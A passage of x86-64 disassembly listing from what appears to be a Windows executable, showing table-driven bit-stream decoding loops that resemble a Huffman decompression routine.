   140002b69:	48 8d 52 08          	lea    0x8(%rdx),%rdx
   140002b6d:	49 03 c1             	add    %r9,%rax
   140002b70:	48 ff c1             	inc    %rcx
   140002b73:	48 0f af c3          	imul   %rbx,%rax
   140002b77:	48 89 42 f8          	mov    %rax,-0x8(%rdx)
   140002b7b:	49 3b c8             	cmp    %r8,%rcx
   140002b7e:	7c e0                	jl     0x140002b60
   140002b80:	44 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%r9d
   140002b87:	00 
   140002b88:	e9 ea fe ff ff       	jmp    0x140002a77
   140002b8d:	45 85 db             	test   %r11d,%r11d
   140002b90:	0f 8e e1 fe ff ff    	jle    0x140002a77
   140002b96:	88 94 24 d9 00 00 00 	mov    %dl,0xd9(%rsp)
   140002b9d:	33 c9                	xor    %ecx,%ecx
   140002b9f:	4a 8d 14 55 00 00 00 	lea    0x0(,%r10,2),%rdx
   140002ba6:	00 
   140002ba7:	4d 63 cf             	movslq %r15d,%r9
   140002baa:	49 03 d5             	add    %r13,%rdx
   140002bad:	4c 03 cf             	add    %rdi,%r9
   140002bb0:	41 0f b6 84 09 e4 01 	movzbl 0x1e4(%r9,%rcx,1),%eax
   140002bb7:	00 00 
   140002bb9:	48 8d 52 04          	lea    0x4(%rdx),%rdx
   140002bbd:	88 84 24 d8 00 00 00 	mov    %al,0xd8(%rsp)
   140002bc4:	48 ff c1             	inc    %rcx
   140002bc7:	0f b7 84 24 d8 00 00 	movzwl 0xd8(%rsp),%eax
   140002bce:	00 
   140002bcf:	66 89 42 fc          	mov    %ax,-0x4(%rdx)
   140002bd3:	66 89 42 fe          	mov    %ax,-0x2(%rdx)
   140002bd7:	49 3b c8             	cmp    %r8,%rcx
   140002bda:	7c d4                	jl     0x140002bb0
   140002bdc:	44 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%r9d
   140002be3:	00 
   140002be4:	e9 8e fe ff ff       	jmp    0x140002a77
   140002be9:	45 85 db             	test   %r11d,%r11d
   140002bec:	0f 8e 85 fe ff ff    	jle    0x140002a77
   140002bf2:	88 94 24 b1 00 00 00 	mov    %dl,0xb1(%rsp)
   140002bf9:	33 c9                	xor    %ecx,%ecx
   140002bfb:	4a 8d 14 55 00 00 00 	lea    0x0(,%r10,2),%rdx
   140002c02:	00 
   140002c03:	4d 63 cf             	movslq %r15d,%r9
   140002c06:	49 03 d5             	add    %r13,%rdx
   140002c09:	4c 03 cf             	add    %rdi,%r9
   140002c0c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002c10:	41 0f b6 84 09 e4 01 	movzbl 0x1e4(%r9,%rcx,1),%eax
   140002c17:	00 00 
   140002c19:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   140002c1d:	88 84 24 b0 00 00 00 	mov    %al,0xb0(%rsp)
   140002c24:	48 ff c1             	inc    %rcx
   140002c27:	0f b7 84 24 b0 00 00 	movzwl 0xb0(%rsp),%eax
   140002c2e:	00 
   140002c2f:	66 89 42 fe          	mov    %ax,-0x2(%rdx)
   140002c33:	49 3b c8             	cmp    %r8,%rcx
   140002c36:	7c d8                	jl     0x140002c10
   140002c38:	44 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%r9d
   140002c3f:	00 
   140002c40:	e9 32 fe ff ff       	jmp    0x140002a77
   140002c45:	cc                   	int3
   140002c46:	cc                   	int3
   140002c47:	cc                   	int3
   140002c48:	cc                   	int3
   140002c49:	cc                   	int3
   140002c4a:	cc                   	int3
   140002c4b:	cc                   	int3
   140002c4c:	cc                   	int3
   140002c4d:	cc                   	int3
   140002c4e:	cc                   	int3
   140002c4f:	cc                   	int3
   140002c50:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002c55:	53                   	push   %rbx
   140002c56:	55                   	push   %rbp
   140002c57:	41 56                	push   %r14
   140002c59:	41 57                	push   %r15
   140002c5b:	48 83 ec 58          	sub    $0x58,%rsp
   140002c5f:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   140002c66:	00 
   140002c67:	4c 8d 34 11          	lea    (%rcx,%rdx,1),%r14
   140002c6b:	4d 8b d0             	mov    %r8,%r10
   140002c6e:	48 8b d9             	mov    %rcx,%rbx
   140002c71:	4d 8b c1             	mov    %r9,%r8
   140002c74:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002c79:	49 8b d2             	mov    %r10,%rdx
   140002c7c:	0f b6 68 02          	movzbl 0x2(%rax),%ebp
   140002c80:	4c 8d 78 04          	lea    0x4(%rax),%r15
   140002c84:	e8 a7 e4 ff ff       	call   0x140001130
   140002c89:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140002c8d:	0f 87 ad 01 00 00    	ja     0x140002e40
   140002c93:	4c 8b 5c 24 30       	mov    0x30(%rsp),%r11
   140002c98:	44 8b 4c 24 28       	mov    0x28(%rsp),%r9d
   140002c9d:	48 89 b4 24 80 00 00 	mov    %rsi,0x80(%rsp)
   140002ca4:	00 
   140002ca5:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002caa:	48 89 bc 24 90 00 00 	mov    %rdi,0x90(%rsp)
   140002cb1:	00 
   140002cb2:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140002cb7:	4c 89 a4 24 98 00 00 	mov    %r12,0x98(%rsp)
   140002cbe:	00 
   140002cbf:	4c 8b 64 24 40       	mov    0x40(%rsp),%r12
   140002cc4:	4c 89 6c 24 50       	mov    %r13,0x50(%rsp)
   140002cc9:	4d 8d 6e fd          	lea    -0x3(%r14),%r13
   140002ccd:	0f 1f 00             	nopl   (%rax)
   140002cd0:	41 83 f9 40          	cmp    $0x40,%r9d
   140002cd4:	76 07                	jbe    0x140002cdd
   140002cd6:	b8 03 00 00 00       	mov    $0x3,%eax
   140002cdb:	eb 52                	jmp    0x140002d2f
   140002cdd:	4d 3b dc             	cmp    %r12,%r11
   140002ce0:	72 12                	jb     0x140002cf4
   140002ce2:	41 8b c1             	mov    %r9d,%eax
   140002ce5:	41 83 e1 07          	and    $0x7,%r9d
   140002ce9:	48 c1 e8 03          	shr    $0x3,%rax
   140002ced:	4c 2b d8             	sub    %rax,%r11
   140002cf0:	33 c0                	xor    %eax,%eax
   140002cf2:	eb 38                	jmp    0x140002d2c
   140002cf4:	4c 3b de             	cmp    %rsi,%r11
   140002cf7:	75 0b                	jne    0x140002d04
   140002cf9:	41 83 f9 40          	cmp    $0x40,%r9d
   140002cfd:	1b c0                	sbb    %eax,%eax
   140002cff:	83 c0 02             	add    $0x2,%eax
   140002d02:	eb 2b                	jmp    0x140002d2f
   140002d04:	41 8b d1             	mov    %r9d,%edx
   140002d07:	49 8b cb             	mov    %r11,%rcx
   140002d0a:	c1 ea 03             	shr    $0x3,%edx
   140002d0d:	33 c0                	xor    %eax,%eax
   140002d0f:	48 2b ca             	sub    %rdx,%rcx
   140002d12:	48 3b ce             	cmp    %rsi,%rcx
   140002d15:	73 0a                	jae    0x140002d21
   140002d17:	41 8b d3             	mov    %r11d,%edx
   140002d1a:	b8 01 00 00 00       	mov    $0x1,%eax
   140002d1f:	2b d6                	sub    %esi,%edx
   140002d21:	8b ca                	mov    %edx,%ecx
   140002d23:	4c 2b d9             	sub    %rcx,%r11
   140002d26:	6b ca f8             	imul   $0xfffffff8,%edx,%ecx
   140002d29:	44 03 c9             	add    %ecx,%r9d
   140002d2c:	49 8b 3b             	mov    (%r11),%rdi
   140002d2f:	33 d2                	xor    %edx,%edx
   140002d31:	49 3b dd             	cmp    %r13,%rbx
   140002d34:	0f 92 c2             	setb   %dl
   140002d37:	33 c9                	xor    %ecx,%ecx
   140002d39:	85 c0                	test   %eax,%eax
   140002d3b:	0f 94 c1             	sete   %cl
   140002d3e:	85 d1                	test   %edx,%ecx
   140002d40:	0f 84 92 00 00 00    	je     0x140002dd8
   140002d46:	41 8b c9             	mov    %r9d,%ecx
   140002d49:	44 8b d5             	mov    %ebp,%r10d
   140002d4c:	41 f7 da             	neg    %r10d
   140002d4f:	48 8b d7             	mov    %rdi,%rdx
   140002d52:	48 d3 e2             	shl    %cl,%rdx
   140002d55:	41 83 e2 3f          	and    $0x3f,%r10d
   140002d59:	41 8b ca             	mov    %r10d,%ecx
   140002d5c:	48 d3 ea             	shr    %cl,%rdx
   140002d5f:	41 0f b6 04 57       	movzbl (%r15,%rdx,2),%eax
   140002d64:	45 0f b6 44 57 01    	movzbl 0x1(%r15,%rdx,2),%r8d
   140002d6a:	48 8b d7             	mov    %rdi,%rdx
   140002d6d:	88 03                	mov    %al,(%rbx)
   140002d6f:	45 03 c1             	add    %r9d,%r8d
   140002d72:	41 8b c8             	mov    %r8d,%ecx
   140002d75:	48 d3 e2             	shl    %cl,%rdx
   140002d78:	41 8b ca             	mov    %r10d,%ecx
   140002d7b:	48 d3 ea             	shr    %cl,%rdx
   140002d7e:	41 0f b6 04 57       	movzbl (%r15,%rdx,2),%eax
   140002d83:	45 0f b6 4c 57 01    	movzbl 0x1(%r15,%rdx,2),%r9d
   140002d89:	48 8b d7             	mov    %rdi,%rdx
   140002d8c:	88 43 01             	mov    %al,0x1(%rbx)
   140002d8f:	45 03 c8             	add    %r8d,%r9d
   140002d92:	41 8b c9             	mov    %r9d,%ecx
   140002d95:	48 d3 e2             	shl    %cl,%rdx
   140002d98:	41 8b ca             	mov    %r10d,%ecx
   140002d9b:	48 d3 ea             	shr    %cl,%rdx
   140002d9e:	45 0f b6 44 57 01    	movzbl 0x1(%r15,%rdx,2),%r8d
   140002da4:	41 0f b6 04 57       	movzbl (%r15,%rdx,2),%eax
   140002da9:	45 03 c1             	add    %r9d,%r8d
   140002dac:	88 43 02             	mov    %al,0x2(%rbx)
   140002daf:	41 8b c8             	mov    %r8d,%ecx
   140002db2:	48 8b c7             	mov    %rdi,%rax
   140002db5:	48 d3 e0             	shl    %cl,%rax
   140002db8:	41 8b ca             	mov    %r10d,%ecx
   140002dbb:	48 d3 e8             	shr    %cl,%rax
   140002dbe:	45 0f b6 4c 47 01    	movzbl 0x1(%r15,%rax,2),%r9d
   140002dc4:	41 0f b6 04 47       	movzbl (%r15,%rax,2),%eax
   140002dc9:	45 03 c8             	add    %r8d,%r9d
   140002dcc:	88 43 03             	mov    %al,0x3(%rbx)
   140002dcf:	48 83 c3 04          	add    $0x4,%rbx
   140002dd3:	e9 f8 fe ff ff       	jmp    0x140002cd0
   140002dd8:	4c 8b 6c 24 50       	mov    0x50(%rsp),%r13
   140002ddd:	4c 8b a4 24 98 00 00 	mov    0x98(%rsp),%r12
   140002de4:	00 
   140002de5:	49 3b de             	cmp    %r14,%rbx
   140002de8:	73 2c                	jae    0x140002e16
   140002dea:	f7 dd                	neg    %ebp
   140002dec:	83 e5 3f             	and    $0x3f,%ebp
   140002def:	90                   	nop
   140002df0:	41 8b c9             	mov    %r9d,%ecx
   140002df3:	48 8b d7             	mov    %rdi,%rdx
   140002df6:	48 d3 e2             	shl    %cl,%rdx
   140002df9:	8b cd                	mov    %ebp,%ecx
   140002dfb:	48 d3 ea             	shr    %cl,%rdx
   140002dfe:	41 0f b6 44 57 01    	movzbl 0x1(%r15,%rdx,2),%eax
   140002e04:	41 0f b6 0c 57       	movzbl (%r15,%rdx,2),%ecx
   140002e09:	44 03 c8             	add    %eax,%r9d
   140002e0c:	88 0b                	mov    %cl,(%rbx)
   140002e0e:	48 ff c3             	inc    %rbx
   140002e11:	49 3b de             	cmp    %r14,%rbx
   140002e14:	72 da                	jb     0x140002df0
   140002e16:	48 8b bc 24 90 00 00 	mov    0x90(%rsp),%rdi
   140002e1d:	00 
   140002e1e:	4c 3b de             	cmp    %rsi,%r11
   140002e21:	48 8b b4 24 80 00 00 	mov    0x80(%rsp),%rsi
   140002e28:	00 
   140002e29:	75 0e                	jne    0x140002e39
   140002e2b:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140002e32:	00 
   140002e33:	41 83 f9 40          	cmp    $0x40,%r9d
   140002e37:	74 07                	je     0x140002e40
   140002e39:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   140002e40:	48 83 c4 58          	add    $0x58,%rsp
   140002e44:	41 5f                	pop    %r15
   140002e46:	41 5e                	pop    %r14
   140002e48:	5d                   	pop    %rbp
   140002e49:	5b                   	pop    %rbx
   140002e4a:	c3                   	ret
   140002e4b:	cc                   	int3
   140002e4c:	cc                   	int3
   140002e4d:	cc                   	int3
   140002e4e:	cc                   	int3
   140002e4f:	cc                   	int3
   140002e50:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002e55:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002e5a:	55                   	push   %rbp
   140002e5b:	53                   	push   %rbx
   140002e5c:	56                   	push   %rsi
   140002e5d:	57                   	push   %rdi
   140002e5e:	41 55                	push   %r13
   140002e60:	48 8d 6c 24 c0       	lea    -0x40(%rsp),%rbp
   140002e65:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140002e6c:	49 8b f1             	mov    %r9,%rsi
   140002e6f:	49 8b d8             	mov    %r8,%rbx
   140002e72:	48 8b fa             	mov    %rdx,%rdi
   140002e75:	4c 8b e9             	mov    %rcx,%r13
   140002e78:	49 83 f9 0a          	cmp    $0xa,%r9
   140002e7c:	73 15                	jae    0x140002e93
   140002e7e:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   140002e85:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
   140002e8c:	41 5d                	pop    %r13
   140002e8e:	5f                   	pop    %rdi
   140002e8f:	5e                   	pop    %rsi
   140002e90:	5b                   	pop    %rbx
   140002e91:	5d                   	pop    %rbp
   140002e92:	c3                   	ret
   140002e93:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
   140002e97:	4c 89 a4 24 70 01 00 	mov    %r12,0x170(%rsp)
   140002e9e:	00 
   140002e9f:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140002ea3:	48 8b cb             	mov    %rbx,%rcx
   140002ea6:	48 83 c0 fd          	add    $0xfffffffffffffffd,%rax
   140002eaa:	4c 89 b4 24 38 01 00 	mov    %r14,0x138(%rsp)
   140002eb1:	00 
   140002eb2:	4c 8b b5 90 00 00 00 	mov    0x90(%rbp),%r14
   140002eb9:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140002ebd:	4c 89 bc 24 30 01 00 	mov    %r15,0x130(%rsp)
   140002ec4:	00 
   140002ec5:	e8 56 e2 ff ff       	call   0x140001120
   140002eca:	44 0f b7 f8          	movzwl %ax,%r15d
   140002ece:	48 8d 4b 02          	lea    0x2(%rbx),%rcx
   140002ed2:	4c 89 7d 00          	mov    %r15,0x0(%rbp)
   140002ed6:	e8 45 e2 ff ff       	call   0x140001120
   140002edb:	44 0f b7 e0          	movzwl %ax,%r12d
   140002edf:	48 8d 4b 04          	lea    0x4(%rbx),%rcx
   140002ee3:	4c 89 65 08          	mov    %r12,0x8(%rbp)
   140002ee7:	e8 34 e2 ff ff       	call   0x140001120
   140002eec:	0f b7 c8             	movzwl %ax,%ecx
   140002eef:	48 8d 53 06          	lea    0x6(%rbx),%rdx
   140002ef3:	41 0f b6 5e 02       	movzbl 0x2(%r14),%ebx
   140002ef8:	4a 8d 04 3a          	lea    (%rdx,%r15,1),%rax
   140002efc:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140002f00:	4c 8b c6             	mov    %rsi,%r8
   140002f03:	49 03 c4             	add    %r12,%rax
   140002f06:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140002f0b:	4c 2b c1             	sub    %rcx,%r8
   140002f0e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002f13:	4d 2b c4             	sub    %r12,%r8
   140002f16:	89 5c 24 3c          	mov    %ebx,0x3c(%rsp)
   140002f1a:	4d 2b c7             	sub    %r15,%r8
   140002f1d:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140002f24:	00 
   140002f25:	48 8d 47 03          	lea    0x3(%rdi),%rax
   140002f29:	49 83 c0 fa          	add    $0xfffffffffffffffa,%r8
   140002f2d:	48 c1 e8 02          	shr    $0x2,%rax
   140002f31:	4c 89 45 18          	mov    %r8,0x18(%rbp)
   140002f35:	4e 8d 24 28          	lea    (%rax,%r13,1),%r12
   140002f39:	4a 8d 0c 20          	lea    (%rax,%r12,1),%rcx
   140002f3d:	4c 89 65 d0          	mov    %r12,-0x30(%rbp)
   140002f41:	48 03 c1             	add    %rcx,%rax
   140002f44:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140002f49:	49 8b f4             	mov    %r12,%rsi
   140002f4c:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002f51:	48 8b f9             	mov    %rcx,%rdi
   140002f54:	4c 8b f8             	mov    %rax,%r15
   140002f57:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002f5c:	4c 3b 85 88 00 00 00 	cmp    0x88(%rbp),%r8
   140002f63:	0f 87 f2 03 00 00    	ja     0x14000335b
   140002f69:	4c 8b 45 00          	mov    0x0(%rbp),%r8
   140002f6d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002f72:	e8 b9 e1 ff ff       	call   0x140001130
   140002f77:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140002f7b:	0f 87 86 09 00 00    	ja     0x140003907
   140002f81:	4c 8b 45 08          	mov    0x8(%rbp),%r8
   140002f85:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140002f8a:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   140002f8e:	e8 9d e1 ff ff       	call   0x140001130
   140002f93:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140002f97:	0f 87 6a 09 00 00    	ja     0x140003907
   140002f9d:	4c 8b 44 24 30       	mov    0x30(%rsp),%r8
   140002fa2:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   140002fa6:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140002fab:	e8 80 e1 ff ff       	call   0x140001130
   140002fb0:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140002fb4:	0f 87 4d 09 00 00    	ja     0x140003907
   140002fba:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140002fbf:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140002fc3:	48 03 54 24 30       	add    0x30(%rsp),%rdx
   140002fc8:	4c 8b 45 18          	mov    0x18(%rbp),%r8
   140002fcc:	e8 5f e1 ff ff       	call   0x140001130
   140002fd1:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140002fd5:	0f 87 2c 09 00 00    	ja     0x140003907
   140002fdb:	49 8b c7             	mov    %r15,%rax
   140002fde:	48 3b 45 c8          	cmp    -0x38(%rbp),%rax
   140002fe2:	0f 83 62 03 00 00    	jae    0x14000334a
   140002fe8:	44 8b cb             	mov    %ebx,%r9d
   140002feb:	8b c3                	mov    %ebx,%eax
   140002fed:	41 f7 d9             	neg    %r9d
   140002ff0:	f7 d8                	neg    %eax
   140002ff2:	41 83 e1 3f          	and    $0x3f,%r9d
   140002ff6:	83 e0 3f             	and    $0x3f,%eax
   140002ff9:	44 89 8d 88 00 00 00 	mov    %r9d,0x88(%rbp)
   140003000:	89 85 98 00 00 00    	mov    %eax,0x98(%rbp)
   140003006:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000300d:	00 00 00 
   140003010:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
   140003014:	4c 8b 64 24 50       	mov    0x50(%rsp),%r12
   140003019:	4c 8b 7c 24 78       	mov    0x78(%rsp),%r15
   14000301e:	49 8b d4             	mov    %r12,%rdx
   140003021:	48 d3 e2             	shl    %cl,%rdx
   140003024:	41 8b c9             	mov    %r9d,%ecx
   140003027:	48 d3 ea             	shr    %cl,%rdx
   14000302a:	8b 4d 80             	mov    -0x80(%rbp),%ecx
   14000302d:	41 0f b6 5c 56 05    	movzbl 0x5(%r14,%rdx,2),%ebx
   140003033:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   140003039:	49 8b d7             	mov    %r15,%rdx
   14000303c:	03 5c 24 58          	add    0x58(%rsp),%ebx
   140003040:	48 d3 e2             	shl    %cl,%rdx
   140003043:	41 8b c9             	mov    %r9d,%ecx
   140003046:	48 d3 ea             	shr    %cl,%rdx
   140003049:	8b 4d a8             	mov    -0x58(%rbp),%ecx
   14000304c:	41 88 45 00          	mov    %al,0x0(%r13)
   140003050:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   140003056:	45 0f b6 54 56 05    	movzbl 0x5(%r14,%rdx,2),%r10d
   14000305c:	44 03 55 80          	add    -0x80(%rbp),%r10d
   140003060:	88 06                	mov    %al,(%rsi)
   140003062:	48 ff c6             	inc    %rsi
   140003065:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   14000306a:	48 8b 75 a0          	mov    -0x60(%rbp),%rsi
   14000306e:	48 8b d6             	mov    %rsi,%rdx
   140003071:	48 d3 e2             	shl    %cl,%rdx
   140003074:	41 8b c9             	mov    %r9d,%ecx
   140003077:	48 d3 ea             	shr    %cl,%rdx
   14000307a:	8b 4d e0             	mov    -0x20(%rbp),%ecx
   14000307d:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   140003083:	45 0f b6 5c 56 05    	movzbl 0x5(%r14,%rdx,2),%r11d
   140003089:	44 03 5d a8          	add    -0x58(%rbp),%r11d
   14000308d:	88 07                	mov    %al,(%rdi)
   14000308f:	48 ff c7             	inc    %rdi
   140003092:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140003097:	48 8b 7d d8          	mov    -0x28(%rbp),%rdi
   14000309b:	48 8b d7             	mov    %rdi,%rdx
   14000309e:	48 d3 e2             	shl    %cl,%rdx
   1400030a1:	41 8b c9             	mov    %r9d,%ecx
   1400030a4:	48 d3 ea             	shr    %cl,%rdx
   1400030a7:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400030ac:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   1400030b2:	45 0f b6 4c 56 05    	movzbl 0x5(%r14,%rdx,2),%r9d
   1400030b8:	49 8b d4             	mov    %r12,%rdx
   1400030bb:	44 03 4d e0          	add    -0x20(%rbp),%r9d
   1400030bf:	88 01                	mov    %al,(%rcx)
   1400030c1:	48 ff c1             	inc    %rcx
   1400030c4:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400030c9:	8b cb                	mov    %ebx,%ecx
   1400030cb:	48 d3 e2             	shl    %cl,%rdx
   1400030ce:	8b 8d 98 00 00 00    	mov    0x98(%rbp),%ecx
   1400030d4:	48 d3 ea             	shr    %cl,%rdx
   1400030d7:	41 8b ca             	mov    %r10d,%ecx
   1400030da:	45 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%r8d
   1400030e0:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   1400030e6:	44 03 c3             	add    %ebx,%r8d
   1400030e9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400030ee:	49 8b d7             	mov    %r15,%rdx
   1400030f1:	48 d3 e2             	shl    %cl,%rdx
   1400030f4:	8b 8d 98 00 00 00    	mov    0x98(%rbp),%ecx
   1400030fa:	48 d3 ea             	shr    %cl,%rdx
   1400030fd:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140003102:	41 88 45 01          	mov    %al,0x1(%r13)
   140003106:	41 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%eax
   14000310c:	44 03 d0             	add    %eax,%r10d
   14000310f:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   140003115:	88 01                	mov    %al,(%rcx)
   140003117:	48 8b d6             	mov    %rsi,%rdx
   14000311a:	48 ff c1             	inc    %rcx
   14000311d:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003122:	41 8b cb             	mov    %r11d,%ecx
   140003125:	48 d3 e2             	shl    %cl,%rdx
   140003128:	8b 8d 98 00 00 00    	mov    0x98(%rbp),%ecx
   14000312e:	48 d3 ea             	shr    %cl,%rdx
   140003131:	41 8b c9             	mov    %r9d,%ecx
   140003134:	41 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%eax
   14000313a:	44 03 d8             	add    %eax,%r11d
   14000313d:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   140003143:	48 8b d7             	mov    %rdi,%rdx
   140003146:	88 03                	mov    %al,(%rbx)
   140003148:	48 d3 e2             	shl    %cl,%rdx
   14000314b:	8b 8d 98 00 00 00    	mov    0x98(%rbp),%ecx
   140003151:	48 d3 ea             	shr    %cl,%rdx
   140003154:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140003159:	41 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%eax
   14000315f:	44 03 c8             	add    %eax,%r9d
   140003162:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   140003168:	88 01                	mov    %al,(%rcx)
   14000316a:	49 8b d4             	mov    %r12,%rdx
   14000316d:	48 ff c1             	inc    %rcx
   140003170:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003175:	41 8b c8             	mov    %r8d,%ecx
   140003178:	48 d3 e2             	shl    %cl,%rdx
   14000317b:	8b 8d 98 00 00 00    	mov    0x98(%rbp),%ecx
   140003181:	48 d3 ea             	shr    %cl,%rdx
   140003184:	41 8b ca             	mov    %r10d,%ecx
   140003187:	41 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%eax
   14000318d:	44 03 c0             	add    %eax,%r8d
   140003190:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   140003196:	41 88 45 02          	mov    %al,0x2(%r13)
   14000319a:	49 8b d7             	mov    %r15,%rdx
   14000319d:	48 d3 e2             	shl    %cl,%rdx
   1400031a0:	8b 8d 98 00 00 00    	mov    0x98(%rbp),%ecx
   1400031a6:	48 d3 ea             	shr    %cl,%rdx
   1400031a9:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400031ae:	41 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%eax
   1400031b4:	44 03 d0             	add    %eax,%r10d
   1400031b7:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   1400031bd:	88 01                	mov    %al,(%rcx)
   1400031bf:	48 8b d6             	mov    %rsi,%rdx
   1400031c2:	48 ff c1             	inc    %rcx
   1400031c5:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400031ca:	41 8b cb             	mov    %r11d,%ecx
   1400031cd:	48 d3 e2             	shl    %cl,%rdx
   1400031d0:	8b 8d 98 00 00 00    	mov    0x98(%rbp),%ecx
   1400031d6:	48 d3 ea             	shr    %cl,%rdx
   1400031d9:	41 8b c9             	mov    %r9d,%ecx
   1400031dc:	41 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%eax
   1400031e2:	44 03 d8             	add    %eax,%r11d
   1400031e5:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   1400031eb:	88 43 01             	mov    %al,0x1(%rbx)
   1400031ee:	48 8b d7             	mov    %rdi,%rdx
   1400031f1:	48 d3 e2             	shl    %cl,%rdx
   1400031f4:	8b 8d 88 00 00 00    	mov    0x88(%rbp),%ecx
   1400031fa:	48 d3 ea             	shr    %cl,%rdx
   1400031fd:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140003202:	41 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%eax
   140003208:	44 03 c8             	add    %eax,%r9d
   14000320b:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   140003211:	8b 95 88 00 00 00    	mov    0x88(%rbp),%edx
   140003217:	88 01                	mov    %al,(%rcx)
   140003219:	48 ff c1             	inc    %rcx
   14000321c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003221:	41 8b c8             	mov    %r8d,%ecx
   140003224:	49 d3 e4             	shl    %cl,%r12
   140003227:	8b ca                	mov    %edx,%ecx
   140003229:	49 d3 ec             	shr    %cl,%r12
   14000322c:	41 8b ca             	mov    %r10d,%ecx
   14000322f:	49 d3 e7             	shl    %cl,%r15
   140003232:	8b ca                	mov    %edx,%ecx
   140003234:	49 d3 ef             	shr    %cl,%r15
   140003237:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   14000323c:	43 0f b6 44 66 05    	movzbl 0x5(%r14,%r12,2),%eax
   140003242:	41 03 c0             	add    %r8d,%eax
   140003245:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140003249:	43 0f b6 44 66 04    	movzbl 0x4(%r14,%r12,2),%eax
   14000324f:	41 88 45 03          	mov    %al,0x3(%r13)
   140003253:	49 83 c5 04          	add    $0x4,%r13
   140003257:	43 0f b6 44 7e 05    	movzbl 0x5(%r14,%r15,2),%eax
   14000325d:	41 03 c2             	add    %r10d,%eax
   140003260:	89 45 80             	mov    %eax,-0x80(%rbp)
   140003263:	43 0f b6 44 7e 04    	movzbl 0x4(%r14,%r15,2),%eax
   140003269:	88 01                	mov    %al,(%rcx)
   14000326b:	48 ff c1             	inc    %rcx
   14000326e:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003273:	41 8b cb             	mov    %r11d,%ecx
   140003276:	48 d3 e6             	shl    %cl,%rsi
   140003279:	8b ca                	mov    %edx,%ecx
   14000327b:	48 d3 ee             	shr    %cl,%rsi
   14000327e:	41 0f b6 44 76 05    	movzbl 0x5(%r14,%rsi,2),%eax
   140003284:	41 03 c3             	add    %r11d,%eax
